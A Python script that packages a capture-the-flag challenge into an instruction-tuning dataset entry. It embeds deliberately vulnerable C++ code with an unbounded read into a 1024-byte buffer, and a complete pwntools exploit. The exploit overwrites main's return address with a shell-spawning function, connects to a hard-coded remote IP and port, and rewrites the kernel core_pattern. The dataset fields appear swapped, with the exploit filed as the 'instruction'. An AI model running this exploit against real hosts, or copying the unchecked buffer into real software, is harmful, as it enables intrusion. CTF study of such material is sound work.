import json

# Simulated data extraction from the text file
challenge_data = {
    "CHALLENGE DESCRIPTION": "It's 1996 all over again!",
    "CHALLENGE SOURCE CODE": """
// compile with -no-pie -fno-stack-protector
#include <iostream>
#include <unistd.h>
#include <stdlib.h>
using namespace std;
void spawn_shell() {
    char* args[] = {(char*)"/bin/bash", NULL};
    execve("/bin/bash", args, NULL);
}
int main() {
    char buf[1024];
    cout << "Which environment variable do you want to read? ";
    cin >> buf;
    cout << buf << "=" << getenv(buf) << endl;
}
""",
    "CHALLENGE SOLUTION": "It's pretty simple to notice the buffer overflow - `main` declares a buffer of 1024 bytes, but does not limit the input read into it. We just need to overflow the buffer, override the return address of `main` with the address of `spawn_shell` and we're done.",
    "CHALLENGE SOLUTION CODE": """
from pwn import *
import argparse
import os
LOCAL_PATH = "./1996"
def get_process(is_remote = False):
    if is_remote:
        return remote("35.207.132.47", 22227)
    else:
        return process(LOCAL_PATH)
def send_payload(proc, payload):
    proc.sendlineafter("Which environment variable do you want to read? ", payload)
def get_overflow_offset():
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(LOCAL_PATH)
    payload = cyclic(1200, n = 8)
    send_payload(proc, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = 8)
    log.info("Overflow offset: {}".format(offset))
    return offset
parser = argparse.ArgumentParser()
parser.add_argument("-r", "--remote", help="Execute on remote server", action="store_true")
args = parser.parse_args()
e = ELF(LOCAL_PATH)
context.binary = e.path
log.info("Address of spawn_shell(): 0x{:02X}".format(e.symbols["_Z11spawn_shellv"]))
offset = get_overflow_offset()
p = get_process(args.remote)
payload = fit({offset: p64(e.symbols["_Z11spawn_shellv"])})
send_payload(p, payload)
p.interactive()
"""
}

# Create dataset entry
dataset_entry = {
    "instruction": challenge_data["CHALLENGE SOLUTION"] + "\n\n" + challenge_data["CHALLENGE SOLUTION CODE"],
    "input": challenge_data["CHALLENGE DESCRIPTION"] + "\n\n" + challenge_data["CHALLENGE SOURCE CODE"],
    "output": "Execute the buffer overflow to spawn a shell."
}

# Convert to JSON for use in a dataset file
dataset_json = json.dumps(dataset_entry, indent=4)
print(dataset_json)

# Optionally, save to a file
with open('dataset.json', 'w') as f:
    json.dump(dataset_entry, f, indent=4)
